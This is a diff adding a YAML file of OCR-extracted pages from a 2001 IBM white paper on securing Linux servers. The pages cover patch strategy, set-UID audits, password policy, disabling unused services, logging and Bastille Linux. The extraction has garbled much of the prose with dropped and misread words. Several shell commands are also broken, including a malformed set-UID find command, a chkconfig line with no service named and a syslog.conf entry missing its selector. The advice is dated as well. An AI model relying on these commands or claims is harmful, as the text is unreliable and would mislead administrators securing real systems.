@@ -1,0 +1,3458 @@
+- img_proc: true
+  md: '# Securing Linux Servers for Service Providers
+
+
+    December 21, 2001
+
+
+    Bill Hilf
+
+    Sr. Consulting I/T Architect
+
+    IBM Corporation
+
+    billhilf@us.ibm.com'
+  merge: -1
+  pgno: 0
+- img_proc: true
+  md: '# # Table of Contents
+
+
+    +   - Overview of Linux in the Service Provider, or xSP, Space ............................................................
+    3
+
+    - Intent and Background.......................................................................................................................
+    4
+
+    - SANS/FBI Top 20 ................................................................................................................................
+    5
+
+    - Security Philosophy.............................................................................................................................
+    6
+
+    - Securing Linux Servers.........................................................................................................................
+    6
+
+    - General Practices..................................................................................................................................
+    6
+
+    - Develop a patch and upgrade strategy...............................................................................................
+    7
+
+    - Understand which programs use Set-UID and Set-GID ................................................................
+    8
+
+    - Develop a password strategy.....................................................................................................................
+    9
+
+    - If you are not using a service, turn it off...............................................................................................
+    11
+
+    - Log intelligently...............................................................................................................................
+    12
+
+    - Use tools where possible.......................................................................................................................
+    14
+
+    - Application security is critical......................................................................................................
+    16
+
+    - Kernel level security............................................................................................................................
+    20
+
+    - Know Your Enemy................................................................................................................................
+    24
+
+    - Linux Firewalls......................................................................................................................
+    24
+
+    - What is a packet filter?..............................................................................................................
+    24
+
+    - Identification and Testing...............................................................................................................
+    27
+
+    - Linux FTP Servers................................................................................................................................
+    30
+
+    - Non-Anonymous FTP...............................................................................................................................
+    30
+
+    - Anonymous FTP....................................................................................................................................
+    31
+
+    - General Linux FTP Server suggestions...............................................................................................
+    32
+
+    - Linux Mail Servers..............................................................................................................................
+    32
+
+    - Sendmail............................................................................................................................................
+    34
+
+    - Postfix...............................................................................................................................................
+    35
+
+    - Qmail...............................................................................................................................................
+    36
+
+    - Linux Mail Virus and Spam Filters...........................................................................................
+    37
+
+    - Linux Web and Application Servers...............................................................................................
+    38
+
+    - Apache Security Configuration Tips......................................................................................
+    48
+
+    - Web server diagnosis...............................................................................................................
+    44
+
+    - Web Services..................................................................................................................................
+    45
+
+    - Web proxies...............................................................................................................................
+    46
+
+    - Conclusion.......................................................................................................................................
+    47
+
+    - Acknowledgements............................................................................................................................
+    48
+
+    - Appendix - Mailing Lists...............................................................................................................
+    48
+
+    - Resources - Web Sites..............................................................................................................
+    48
+
+    - Resources - Books....................................................................................................................
+    48
+
+    - Resources - Tools....................................................................................................................
+    49
+
+    - Application Security..............................................................................................................
+    49
+
+    - Intrusion Detection Systems..................................................................................................
+    49
+
+    - Security Testing Tools.......................................................................................................
+    50
+
+    - Password Tools..................................................................................................................
+    51
+
+    - Network Scanners...............................................................................................................
+    52
+
+    - Port Scan Detectors..............................................................................................................
+    52
+
+    - Encryption........................................................................................................................
+    53
+
+    - Log and Track Monitors.......................................................................................................
+    53
+
+    - Sniffers.................................................................................................................................
+    55'
+  merge: -1
+  pgno: 1
+- img_proc: true
+  md: '# Overview of Linux in the Service Provider, or xSP
+
+
+    The term "xSP" is simply the consolidation of the Service Provider acronyms. Initially
+    only ISPs and ASPs were known in this domain, but as the Internet and eBusiness
+    matured, new service provider models quickly followed. Infrastructure "SPs" such
+    as managed service providers (MSPs) which provide fully managed services (network,
+    storage, servers, administration, etc.) and business service providers (BSPs),
+    who provide value to their customers through application access or aggregation
+    (ASPs), content providers or increasingly through outsourced processes.
+
+
+    But let''s not get lost in the acronym, but rather focus on the common elements
+    among service providers and how these elements need to be secured under Linux.
+    One of the clear similarities among service providers is the ability to supply
+    network enabled customers. Whether it be in the form of a dial-up service, a Web-enabled
+    application, relational databases, storage solutions, or an email account, these
+    services all multiple traits.
+
+
+    Sharing infrastructure and services are primary components in the economies of
+    scale for building a service provider business. The degree that these components
+    are shared at the hardware, network, server, or application layer – but there
+    are few, if any, scenarios where some part the service provider fabric is not
+    shared by multiple customers. This is a critical factor to understanding security
+    in a service provider environment. Since these services are essentially available
+    to the public, they must be considered un-trusted. Although a service provider
+    may not consider their customers "public" or un-trustworthy, if the service is
+    accessible to users over the Internet (regardless of if they have to pay for that)
+    it could potentially be exploited by any machine on the Internet.
+
+
+    Operating system security in Internet based services is more important than ever.
+    Beyond the obvious heightened awareness around security after the tragedies of
+    September 11th, there are many financial needs that have elevated security as
+    a critical IT issue. Recently, PricewaterhouseCoopers updated its Security Benchmarking
+    Service to include new data from InformationWeek''s 2001 Global Information Security
+    Survey. The survey, fielded by PricewaterhouseCoopers, reveals that these global
+    corporations realized over $1.3 trillion in lost revenue due to security breaches
+    over the past year. Globally, the propagation of computer viruses is a significant
+    contributor to the trillion dollar losses, with 60% of survey respondents reporting
+    they lost productivity due to computer viruses and denial of service attacks.
+    The number one security breach was reported against operating systems.
+
+
+    > PricewaterhouseCoopers'' Security Benchmarking Service evaluates an organization''s
+    security program against a global database of approximately 4,500 survey responses
+    from technology professionals in 50 countries.'
+  merge: -1
+  pgno: 2
+- img_proc: true
+  md: 'The rapid evolution of Internet security exploits is clearly seen in the statistics
+    at CERT/CC, the canonical organization for reporting computer security incidents
+    and vulnerabilities. The number of security incidents for just the first three
+    quarters of 2001 was 34,754. The number of security incidents for the year 2000
+    was 21,756. The total number on incidents reported from 1989-1999 was 25,949.
+    Amazingly, in just nine months in 2001, CERT has reported more security incidents
+    than a decade''s worth of incidents between 1989 and 1999. The scourge of attacks,
+    viruses, worms, and Trojan horses being used by way of the Internet is woefully
+    affeared.³
+
+
+    Increasingly, service providers are utilizing Linux as a secure, reliable, high
+    performing, and cost effective server operating system. The choice of Linux makes
+    perfect sense to service providers the Linux operating system itself was designed
+    and developed with the Internet in mind. Linus Torvalds credits much of the success
+    of Linux to the existence of Linux, which allowed for the creation of a complete
+    operating system between hundreds, if not thousands, of professionals in a decentralized
+    development model⁴ An operating system developed via the Internet is an ideal
+    match for service providers, which build and operate their businesses by means
+    of the Internet. The total cost of ownership, flexibility and outstanding track
+    record of the Linux operating system is driving this usage, and more than ever,
+    service customers need to understand how to ensure their Linux systems are secure.
+
+
+    # Intent and Background
+
+
+    The intent of this document is to clearly explain the steps needed to secure a
+    Linux server. As well as specific steps for the most commonly used implementations
+    of Linux servers in the service provider environment. It is beyond the scope of
+    this document to illustrate every facet of Linux security, the tools or methods
+    for protecting against all attacks. The vulnerabilities and recommended security
+    solutions are based on professional experiences and are meant to provide examples
+    and best practices in many of the common security threats found in Linux servers
+    today.
+
+
+    Many of the examples and practices in this domain are from my own experiences
+    designing, developing and operating Web systems. As an architect in the IBM Emerging
+    & Competitive Markets organization, I am involved with a variety of service providers
+    and emerging businesses. My primary area of expertise is in Linux based infrastructures
+    as it applies to these markets. Before joining IBM, I headed the engineering department
+    for Toys a popular e-commerce site for children''s products. Due to the exposure
+    of EToys.com site, we were the recipients of daily, and at times hourly, port
+    scans, denial of attacks attacks and intrusion attempts. For better (learning)
+    or worse (sleep) my team and I were the folks at 2 a.m. to respond to these threats.
+    Before
+
+
+    > ²http://www.cert.org/stats.html
+
+    ³According to the CSI 2001 Computer Crime and Security Survey, the rise in citing
+    their Internet connections as a frequent point of attack from 59% in 2000 to 70%
+    in 2001
+
+    http://www.gocsi.com/prelu/000321.html.
+
+    http://resources.cisco.com/partner/tree.ta?asset_id=75234'
+  merge: -1
+  pgno: 3
+- img_proc: true
+  md: '# IBM
+
+
+    EToys, I was an engineer at CNET Networks, which is composed of a variety of Web
+    sites, such as Cnet.com, News.com, Download.com, Shareware.com, Computers.com,
+    and others. Each of these site provided different services (such as content distribution,
+    advertising, software archives, Web-based applications, and other managed and
+    hosted services), CNET was exposed to a wide array of probes and intrusion attacks.
+    Through these experiences, I have "cut teeth" on real world attacks on Linux and
+    Unix systems. Hopefully, this document will provide some practical advice that
+    can help you or your customers from getting a page or phone call at 2 a.m.
+
+
+    # SANS/FBI Top 20
+
+
+    As a framework, this paper will use a recently published report from the SANS/FBI
+    National Infrastructure Protection Center (NIPC) on the top security vulnerabilities.
+    This list is used by many businesses as a guide for which vulnerabilities to protect
+    against, and the relative importance of each security threat. This list has proven
+    value as it is compiled by well respected security organizations, and moreover,
+    many of today''s successful attacks on computer systems via the Internet can be
+    traced to exploitation of security flaws. This list is composed of three parts,
+    General Vulnerabilities, Windows Vulnerabilities, and Unix Vulnerabilities. For
+    the purpose of securing Linux servers in a service provider environment, this
+    document will utilize issues from the General and Unix Vulnerability list, the
+    Top Windows Vulnerabilities will not be included.
+
+
+    Top General Vulnerabilities:
+
+
+    +   1. Default installs of operating systems and applications
+
+    2. Accounts with no passwords or weak passwords
+
+    3. Non-existent or incomplete backups
+
+    4. Large number of open ports
+
+    5. Not filtering packets for correct incoming and outgoing addresses
+
+    6. Non-existent or incomplete logging
+
+    7. Vulnerable CGI programs
+
+
+    Top UNIX Vulnerabilities:
+
+
+    +   1. Buffer overflows in RPC services
+
+    2. Sendmail vulnerabilities
+
+    3. BIND weaknesses
+
+    4. R commands
+
+    5. LPD (remote print protocol daemon)
+
+    6. sadmind and mount
+
+    7. Default SNMP strings
+
+
+    I recommend visiting the SANS/FBI Web site, as it provides detailed descriptions
+    of each vulnerability and generic security solutions and resources. This document
+    will address each of these as it directly relates to securing Linux servers in
+    a service provider environment.'
+  merge: -1
+  pgno: 4
+- img_proc: true
+  md: '# Security Philosophy
+
+
+    Security is, for all intents, a practice of managed risk. The degree and strength
+    of your system security is a direct derivative to the strength of your commitment
+    to manage it. It is not realistic, nor possible, to unequivocally deem any operating
+    system completely secure. The continuum of security slides between ease of use
+    and business requirements or methodology that will ensure the security of a system.
+    Like all real-world technical designs, it is a practice of setting and meeting
+    requirements and the consideration of limitations imposed by those requirements.
+    Defending your Linux server is based on understanding these security requirements,
+    best practices and experience.
+
+
+    This document will highlight some best practices, experiences, and tools used
+    for the management of security risk in Linux server environments. The security
+    requirements and limitations your business is willing to accept from those requirements
+    will not be addressed as these obviously vary significantly between businesses.
+    However, this document will attempt many best practices and experiences that are
+    commonly found and used in the service provider environment.
+
+
+    Lastly, and without veering too far into the realm of philosophy, it is useful
+    in briefly discussing an important concept or “mind-set” that is considering in
+    a general sense – complexity theory. Computer systems are collections of various
+    sub-systems and components – be hardware, software, or communication across and
+    between. It is very common to analyze a system in a reductionist paradigm in other
+    words, breaking things down into individual components in order to understand
+    their nature. Although this is often a critical scientific method for diagnosing
+    a security issue, it is important to understand the interactions of components
+    in a system. Complexity is about we these components interact – which differs
+    from being merely complicated (composed of many intricate parts). In securing
+    and designing a Linux server, it is important to understand the interactions of
+    a system, as these interactions can shape the patterns that display potential
+    security issues (among other things). Successful security experts tend to subscribe
+    to complexity theory. In other words, see the forest from the trees.
+
+
+    # Securing Linux Servers
+
+
+    # General Practices
+
+
+    There are many security best practices that apply to all types of Linux installations
+    – particularly in regards to publicly available systems, such as servers. Below
+    are listed a few key best practices to consider as any of Linux server security
+    strategy. An important disclaimer is needed here – there are no 100% security
+    validations, each of these recommendations has the possibility to be exploited.
+    For example, you may receive a valid digital signature from an application vendor’s
+    Web site, but there is no guarantee that their site has not been cracked and the
+    intruder modified the software and signatures to appear valid. Further, if your
+    local system has been penetrated, the intruder'
+  merge: -1
+  pgno: 5
+- img_proc: true
+  md: '# IBM
+
+
+    may have modified the system tools on your server. For example, the intruder may
+    have modified the “pgp” program that it never fails an encryption check – resulting
+    in all downloaded files and their signatures appearing to be bona fide. What is
+    the lesson here? As they say in the X-Files, “Trust No One”, assume that no single
+    site or source is secure and double check everything you put on your server.
+
+
+    # Develop a patch and upgrade strategy
+
+
+    A large amount of Linux security exploits are based on vulnerabilities in commonly
+    used Open Source software, as BIND, Sendmail, NFS, “r”-programs (exec, rsh, rpc).
+    One of the main advantages of Open Source software is the speed at which vulnerabilities
+    are identified and patched. Because of this, it is important to develop a strategy
+    for upgrading critical software components. This strategy should include the following
+    processes:
+
+
+    +   - Assignment and subscription to security related lists. This includes a vendor’s
+    security update mailing list (Red Hat, SuSE, Caldera, TurboLinux, etc.), as well
+    as security advisory mailing lists from your local incident response team. These
+    mailing lists are typically low volume and provide invaluable information for
+    system and security administrators. Mail list information is provided in the Resources
+    section at the end of this month.
+
+    - Retrieval of the latest patch list from your vendor and retrieval of recommended
+    security patches not included with your system. Some Linux distributions provide
+    tools for automatically checking the packages on a local system with the latest
+    recommended patches (such as SuSE YaST and RedHat Up2date). Some patches may re-enable
+    configurations so it is important to go this checklist after installing any new
+    packages or patches. Patches for software applications not supplied by the operating
+    system vendor should be obtained directly from the software vendor’s web site.
+
+    - Ensure that software patches and packages are only downloaded from a reliable
+    source (i.e. from the vendor or a trusted mirror).
+
+    - Verify the cryptographic signature of any signed downloaded files to ensure
+    integrity. Never use a file whose signature doesn''t match its contents. PGP (http://www.pgp.org)
+    and GnuPG (http://www.gnupg.org) can be used for encryption and authentication
+    and are commonly used by many Open software developers to develop digital signatures.
+    Learn how to use GnuPG to verify digital signatures: http://www.dewinter.com/gnupg_howto/english/
+
+    - Verify the md5 checksum, when possible, of any downloaded patches with a utility
+    like md5 or md5sum. Md5sum is standard utility on all major distributions and
+    is very straightforward to use “md5sum -c md5-file” will check the integrity of
+    the md5 file. For, Red Hat includes an “MD5” file in the same directory as their
+    distribution ISO images. The file contains MD5 entries for each
+
+
+    © Copyright IBM. Corp. 2001. All rights reserved.'
+  merge: -1
+  pgno: 6
+- img_proc: true
+  md: 'file in that directory which can be used to verify authenticity (e.g., ntp://ftp.redhat.com/pub/redhat/redhat-7.2-en/iso/i386).⁵
+
+
+    +   - Using RPM as your package management system, the “K-” or “—checksig” options.
+    These options to the rpm command verify the cryptographic signature of the package.
+
+
+    # Understand which programs are Set-UID and Set-GID
+
+
+    Many exploits occur in programs which are set-UID or set-GID root. Set-UID/GID,
+    or Set UserID and Set GroupID, are bits set on a program that allow that be executed
+    and run as the privileged user. This can be a significant security issue for programs
+    that are set-UID/GID for root, such as a buffer overflow, or a software bug can
+    result in a change in user identification and privileges—potentially escalating
+    the user to a root compromise. — Because of this potential security vulnerability,
+    it is very important to know which programs are set-UID/GID root and to determine
+    if they need to have this functionality for the tasks assigned for Linux server.
+
+
+    Understanding all programs which have set-UID/GID is important and should be documented
+    in your security policy. However, you may be interested in quickly scanning for
+    set-UID root files and programs. For example, here is a simple command to search
+    for all files under "root" ("-perm", or permission bits, with an octal value of
+    4000 is the set-UID bit:
+
+
+    ```
+
+    find /user root -perm -4000 -ls
+
+    ```
+
+
+    Another useful operation is to look for all files whose UID or GID are not in
+    /etc/passwd or /etc/group, respectively. Although, this may produce data created
+    from someone extracting a tar archive, it could also be from extracting a rootkit,
+    or other malicious archive. Rootkits are discussed in the ““Your Network” section
+    below.
+
+
+    ```
+
+    find / -fstype proc '' -nouser -nogroup '' -ls
+
+    ```
+
+
+    To remove the set-UID/GID bit from a program, use chmod ug-s program. You may
+    also want to consider making critical systems programs (such as in /bin,/sbin,/usr/bin,/lib)
+    immutable or unchanging. Typically these programs do not change, and if they need
+    to be patched or removed, the “att” command is designed for this purpose. A program
+    modified with “chattr +i program” cannot be deleted or renamed, no link can be
+    created to this file and no data can be written to it. Only the root user can
+    set or clear this attribute. As a rule of
+
+
+    > ⁵ MD5 is an algorithm developed by Ronald Rivest for digital signatures (http://theory.cs.umass.edu/~rivest/Rivest-MD5.txt).
+    MD5 is a one-way hash function; in other words, the algorithm variable length
+    input (often called the “message”, or “pre-image”") converts it into a 128-bit
+    hash value (this fixed string is called the message digest). For an excellent
+    resource on one-way hash functions, and all things cryptography, see Bruce Schneier,
+    Applied Cryptography (details in Appendix).'
+  merge: -1
+  pgno: 7
+- img_proc: true
+  md: 'thumb, if you don''t know explicitly why program has set-UID/GID root, you
+    should immediately learn why, and if not necessary to the server''s functionality,
+    disable it.
+
+
+    # Develop a password strategy
+
+
+    Passwords are still a major security exposure and quite often a direct means to
+    a compromised system (number on the Top General Vulnerabilities SANS/FBI list).
+    For maintaining secure passwords across Linux servers, develop a strategy which
+    includes the following processes:
+
+
+    +   - Limit the use of privileged accounts, especially superuser. Root privileges
+    should be limited to mission staff only. Rule of thumb- give privileges only to
+    those who require it and know how to recover from mistakes they may make as the
+    superuser. A useful tool for controlling privilege on Linux is the ''sudo'' utility.
+    Sudo (superuser) allows a system administrator to give certain users (or groups
+    of users) the ability to run some (all) commands as root or another while logging
+    the commands and arguments. A service provider could offer the ability to start
+    Apache via root sudo, without providing any root privileges to the customer. For
+    more information, see: http://www.courtenas.com/sudo/intro.html
+
+
+    +   - Use shadow passwords. Shadow passwords are an encrypted version of /etc/passwd,
+    found in /etc/shadow. Most Linux distributions implement shadow passwords as default
+    as this is such a security measure. However, you should verify each Linux server
+    that you maintain and install to ensure it is using shadow passwords. The ''pwck''
+    command will validate the integrity of /etc/shadow against /etc/passwd.
+
+
+    +   - Develop a password creation guide. Including:
+
+    - Never tell anyone password or write your password down (i.e., post-it notes)
+
+    - Recommended password creation tips (length, punctuation, numbers, etc.). Crackers
+    use multiple programs to guess passwords. Many of these programs operate on multi-language
+    dictionaries that attempt to guess words, and in multiple combinations, such:
+
+    - Any word, written backwards
+
+    - Any word, with a punctuation character at the end
+
+    - Any word, with a punctuation character at the beginning
+
+    - Any word, with a punctuation character in the 3rd character place
+
+    - Any word, capitalized
+
+    - Any two words, put together with a number between them
+
+
+    The obvious lesson is not to use words for passwords, instead recommend a mnemonic
+    of a favorite phrase or quote and then add or change appropriate capitalizations,
+    punctuation, and other character manipulations. Such as "Chance favors only the
+    prepared mind" could be changed to "Cf0tpPm"'
+  merge: -1
+  pgno: 8
+- img_proc: true
+  md: '+   - Validate the system passwords. Regularly use tools such as “Crack” and
+    “John Ripper” (detailed in Resources section at the end of this document) to attempt
+    to crack your system passwords. This is what intruders will use, so it is better
+    to find out the results before they do. A good practice is to put this on the
+    security checklist right after each password expiration/recreation scheduled window.
+
+
+    +   - Create a password aging policy. Based on the requirements of the business,
+    create a policy to expire passwords at a specific frequency. This can be controlled
+    via the “change” command. Can specify the minimum/maximum number of days each
+    user''s password is valid, as well as the ability to expire a password after a
+    specified amount of inactivity. This should be used for all passwords, including
+    superuser!
+
+
+    Many distributions support tools to simplify the password configuration process,
+    such as SuSE’s YaST2, seen below.
+
+
+    ![](img/bfe6ea110ea710ed0e76c993ed104f90_9_0.png)'
+  merge: -1
+  pgno: 9
+- img_proc: true
+  md: '# IBM
+
+
+    # If you are not using a service, turn it off
+
+
+    Typically, Linux servers are deployed for task specific operations – serving Web
+    pages, running a Java application server, providing DNS, authenticating LDAP requests,
+    firewalls and gateways. however, most Linux distributions include features and
+    services to enable a wide scope of functionality – usually far more than you need
+    and want on a typical Linux server deployment. Many of the latest Linux distribution
+    release warnings if you attempt to install a service that has the potential for
+    security vulnerability, such as telnet. I highly recommend you pay attention to
+    these warnings and take considerable effort to validate that the services are
+    running critical for the function of the Linux server you are configuring.
+
+
+    Exploits of this nature are found around the SANS/FBI list, including the number
+    one Top General Vulnerability, "Default Install of Operating System and Applications."
+    The first step in securing this is to disable what you do not need. On per basis,
+    you should validate what specific services are required and disable everything
+    not required. Here how to handle services with Red Hat’s chkconfig and SuSE’s
+    YaST2.
+
+
+    With Red Hat, the "chkconfig" utility, which services are enabled and at run level:
+
+
+    ```
+
+    [root@fangom sambal# chkconfig --list
+
+    altd 0:off 1:off 2:off 3:off 4:off 5:off 6:off
+
+    rrwd 0:off 1:off 2:off 3:off 4:off 5:off 6:off
+
+    keytable 0:off 1:on 2:off 3:on 4:on 5:off 6:off
+
+    nscd 0:off 1:off 2:off 3:on 4:on 5:off 6:off
+
+    syslog 0:off 1:off 2:off 3:on 4:on 5:off 6:off
+
+    gpm 0:off 1:off 2:off 3:on 4:on 5:off 6:off
+
+    kudzu 0:off 1:off 2:off 3:on 4:off 5:off 6:off
+
+    kcdrocrate 0:off 1:off 2:off 3:on 4:off 5:off 6:off
+
+    lpd 0:off 1:off 2:off 3:on 4:on 5:off 6:off
+
+    [...]
+
+    ```
+
+
+    Let’s operate a Linux Web server at run level 3 (multi-user and networking)⁶ From
+    the snippet above we can see that we have a variety of services running at that
+    level. Since this server is being used only as a Web server, it is not necessary
+    to run the lpd printer daemon on this system, so we should disable this via chkconfig.
+    The following line disables the lpd service from run level 3:
+
+
+    ```
+
+    [root@fangom treebeard# chkconfig --level 3 off
+
+    ```
+
+
+    chkconfig basically makes symbolic links in the /etc/rc[0-6].d directories. chkconfig
+    does not delete the actual program or service, only if the service is enabled
+    in the Linux init process on boot-up. There, chkconfig will occur on the boot
+    of the server. To add or delete a service from chkconfig usage --add or --del
+    (man chkconfig for more detail). Red Hat includes a tool called “service” allows
+
+
+    > ⁶For an explanation on run-levels, see: http://www.linuxworld.com/linuxworld/lw-2001-01/lw-01-geek_1.html
+
+
+    © Copyright IBM. Corp. 2001. All rights reserved.'
+  merge: -1
+  pgno: 10
+- img_proc: true
+  md: '# IBM
+
+
+    similar functionality to, but through chconfig login GTK-based graphical interface.
+    Red Hat
+
+    also provides an easy command line interface, "ntsys", for
+
+    enabling/disabling services started at boot. Both chconfig and ntsys work without
+    an Xu
+
+    server installed on the system, which is typical for many Linux servers.
+
+
+    With SuSE, you can use YaSt2 to disable/enable services, both from the command
+    line
+
+    nor a GUI:
+
+
+    ![](img/bfe6ea110ea710ed0e76c993ed104f90_11_0.png)
+
+
+    | Status | Service | Type | Proto | Flags | User | Ser |
+
+    |---|---|---|---|---|---|---||
+
+    | Active | talk | stream | tcp | nowait | root | /usr |
+
+    | | login | stream | tcp | nowait | root | /usr |
+
+    | # | exec | stream | tcp | nowait | root | /usr |
+
+    | Active | ntkld | stream | tcp | nowait | root | /usr |
+
+    | | pop2 | stream | tcp | nowait | root | /usr |
+
+    | | pop3 | stream | tcp | nowait | root | /usr |
+
+    | | imap | stream | tcp | nowait | root | /usr |
+
+    | | consat | dgram | udp | nowait | root | /usr |
+
+    | | tftp | stream | tcp | nowait | uucp | /usr |
+
+    | | dtgp | dgram | udp | nowait | root | /usr |
+
+    | | bootsps | dgram | udp | nowait | root | /usr |
+
+    | Active | finger | stream | tcp | nowait | nobody | /usr |
+
+    | | sustat | stream | tcp | nowait | | | |
+
+
+    # Logging intelligently
+
+
+    Logging is a regularly over-applied/under-utilized resource. Many applications
+    can log
+
+    to various system and log files, but these are often not analyzed or securely
+
+    managed. Linux servers should employ logging only where they will be utilized.
+
+    for example, if you plan on logging all packets from your iptables firewall rules
+    (detailed
+
+    below), make sure you know how to use these logs and how to secure and archive
+    these
+
+    logs as they grow over time.
+
+
+    Syslog is a robust logging system that provides a common method for logging
+
+    disparate applications. Syslog is configured in /etc/syslog.conf and follows a
+    simple
+
+
+    - 12 -'
+  merge: -1
+  pgno: 11
+- img_proc: true
+  md: 'facility.loglevel/target format. For example, to log all mail messages to /var/log/maillog
+    every("*") log levels, specify in /etc/syslog.conf:
+
+
+    ```
+
+    # Log all the mail messages in one place.
+
+    var/log/maillog
+
+    ```
+
+
+    Programming application events to syslog is reasonably clear-cut. The following
+    is an article describing how to program to syslog from Java:
+
+    http://www.javaaworld.com/javaworld/jw-04-2001/jw-0406-syslog.html
+
+
+    It is just as important to monitor logs as it is to log in the first place. There
+    are several tools and applications available for parsing various types of logs,
+    matching for patterns (e.g., unsuccessful login attempts), and acting on these
+    patterns (e.g., sending email to admin). A few most common tools for scanning
+    log files are mentioned in the Resources section. It is well worth spending the
+    time to thoroughly learn how to configure the log scanning/analysis application(s)
+    you choose to generate a large number of actions and alerts based on false positives.
+    Initial configuration of log monitoring applications can save you in the long
+    run.
+
+
+    Archiving and securing logs are important factors in a Linux server logging plan.
+    Logs can grow by orders of magnitude under significant server traffic, or denial
+    of service attacks, and will quickly consume physical disk space. Keep logs which
+    grow quickly in scheduled `log watchers` in cron. For example, to keep an eye
+    on your Apache Access_log, you could periodically run:
+
+
+    ```
+
+    du -k /usr/local/apache/logs/access_log
+
+    ```
+
+
+    Which would return the size (in bytes; use “m” to see size in megabytes) of the
+    access_log. This number can be compared to a pre-defined limit and alerts when
+    the “du” output exceeds the limit.
+
+
+    Secondly, consider measures to validate log integrity. Log files are typically
+    the last intruder will want to modify or destroy, to cover their tracks. If you
+    are attempting a potential intrusion, you be able to trust the logs you may need
+    to use evidence. One simple measure is to use the “chattr” command to allow the
+    logs to be appended to:
+
+
+    ```
+
+    chattr +a /var/log/maillog
+
+    chattr +a /var/log/messages
+
+    chattr +a /var/log/samba
+
+    ```
+
+
+    There are other methods for ensuring log integrity, such as using an intrusion
+    detection system (IDS), MD5 checksums against the archived log files, or logging
+    to a separate server altogether. Logging locally and sending log to a remote server
+    provides an additional security layer, as well as redundancy for your log files.
+    Additionally, these files can be compared for integrity (possibly generating MD5'
+  merge: -1
+  pgno: 12
+- img_proc: true
+  md: 'digests on each log file before transport to a remote server), as well as providing
+    an easy method for comparing files across servers in one location, presenting
+    a global perspective of all log activity. For further security, this "remote server"
+    could be a write-only media, such as a CD-R mounted from a protected Linux server.
+    Of course, creativity on this continuum increases linearly with your degree of
+    paranoia.^7
+
+
+    # Use tools where possible
+
+
+    As security is a complex subject, it is recommended to get a helping wherever
+    possible. There are a variety of tools included with each Linux distribution to
+    help configure network services, user/group configuration, there are also thousands
+    of tools available in the Open Source community which assist as well. One of the
+    more well known tools for assisting in "hardening" a Linux system is Bastille
+    Linux.
+
+
+    Bastille Linux ([http://www.bastille-linux.org/](http://www.bastille-linux.org/))
+
+
+    The Bastille Hard’s Hardening Systems to "harden" or "tighten" the Linux operating
+    system, and currently supports Red Hat and Mandela distributions. Bastille Linux
+    draws from a variety of reputable source on Linux security. The initial development
+    integrated author Jay Beal''s securing Solaris and Linux with major points from
+    the SAN''S Securing Linux by Step, Kurt Sefried''s Linux Administrator''s Security
+    Guide, and many other sources. There is a recent patch to Bastille Linux from
+    the IBM Linux Technology Center, which was created by Niki Rahhemi to support
+    Suse E72 and Turbolino 7.0 ([http://software.ibm.com/developerworks/opensource/patches/bastille/suse72_tl70-2.patch.gz](http://software.ibm.com/developerworks/opensource/patches/bastille/suse72_tl70-2.patch.gz)).
+    Both patches have been submitted to the Bastille Linux team and the Bastille mailing
+    list.
+
+
+    Bastille Linux has been designed to educate the administrator about the security
+    issues involved in each of the script''s tasks, securing both the box and the
+    administrator. Each step is optional and contains a description of the security
+    issues involved. Here are two examples when running InteractiveBastille:
+
+
+    <step 4>
+
+
+    Q: Would you like to disable SUID status for the r-tools? [Y]
+
+    The BSD r-tools rely on IP-based authentication, which means that can allow anyone
+    with (for instance) root access on 192.168.1.1 have root access on 192.168.1.2.
+    Administrators and other users have found this useful, as it lets connect one
+    to another without having to retry a password.
+
+
+    The problem with IP-based authentication, however, is that an intruder can craft
+    "spoofed" or faked packets which claim to be from a trusted machine. Since the
+    r-tools rely entirely on IP addresses for authentication, a spoofed packet will
+    be accepted as real.
+
+
+    > ^7 For some clever tricks, see Lane Spitzer''s white paper on building honeynets
+    at [http://www.rootprompt.org/article.php3?article=210](http://www.rootprompt.org/article.php3?article=210).
+    This paper discusses issues such as logging to non-IP addressable remote servers,
+    using submitted to pick up the logs messages, and alternate protocols for remote
+    addressing.
+
+
+    © Copyright IBM. Corp. 2001. All rights reserved.
+
+
+    - 14 -'
+  merge: -1
+  pgno: 13
+- img_proc: true
+  md: '# IBM
+
+
+    Would you like to disable SUID status for the r-tools? [Y]
+
+
+    +   X Yes x
+
+    X No x
+
+    < Back > < Next > < Explain Less >
+
+
+    <step 9>
+
+
+    Q: Would you like to enforce password aging? [Y]
+
+    Red Hat and Linux-Mandrake''s default behavior, which we would change here, is
+    to disable an account when the password hasn''t changed in 99,999 days. This interval
+    is just too long to be useful. We can set the default to 180 days. At some point
+    before the 180 days have, the system will ask the user to change or her password.
+    At the end of the 180 days, if the password has not been changed, the account
+    will be temporarily disabled.
+
+    We would make this change in /etc/login.defs.
+
+
+    Would you like to enforce password aging? [Y]
+
+
+    +   X Yes x
+
+    X No x
+
+    < Back > < Next > < Explain Less >
+
+
+    The above was taken from the Curses-based interface, run on a Linux server without
+    an X server installed. This is very useful, as a windowing system, such as X,
+    is often not installed in a Linux server. Bastille Linux also supports a Tk based
+    interface for a richer GUI, if desired. Additionally, the example above shows
+    how Bastille Linux educates and describes each security step – it also defaults
+    to the recommended best practice (such as disabling SUID on r-tools, and implementing
+    180 day password aging), although you can override, or just skip these if you
+    prefer.
+
+
+    YaST
+
+    SUSE Linux provides a similar tool-based approach to system hardening, via both
+    YaST and YaST2. As we''ve already seen the YaST2 interface (in an xterm) to configure
+    network services and some common security settings.'
+  merge: -1
+  pgno: 14
+- img_proc: true
+  md: '# # IBM
+
+
+    ![](img/bfe6ea110ea710ed0e76c993ed104f90_15_0.png)
+
+
+    # Application security is critical
+
+
+    Last, but certainly not, of the General Server security practices is application
+    security. Almost any linux server checklist will include a series of security
+    measures for networks, operating system, file system, user/group accounts, and
+    even physical security issues, such as location and console connectivity. Very
+    few, however spend time and effort on securing applications on Linux. Why? The
+    short answer is because it is difficult and analyze behavior better than identifying
+    ports with UDP servers versus identifying a few security issues, particularly
+    as they relate to SAN/FBI items number four "Vulnerable CGI programs" in Top General
+    Vulnerabilities (Web/Application Security Server) and item eight "Buffer overflows
+    in RPC services" in Top Linux Vulnerabilities. However, by this document will
+    cover all -- or a large portion -- of application security issues on Linux. Analyzing,
+    understanding, designing and managing application security is essential for a
+    linux server infrastructure, and it is recommended to utilize experts for application
+    security and privacy if your customer does not have the available skills. Based
+    on my experiences, if you have to draw a pie chart budgeting time and resources
+    for security, give at least half of the pie to application security.
+
+
+    +   * Global Services offers a wide array of services, including security and
+    privacy assessments, planning, architecture, design, implementation, and management.
+    See: http://www.ibm.com/services/
+
+    * For a very good tutorial, see "Avoiding security2001 when developing an application"
+    at LinuxFocus: http://www.linuxfocus.org/English/January2001article182.shtml.
+    Another, more generic Unix programming security FAQ can be found at: http://www.whitefang.com/sup/secure-faq.html
+
+
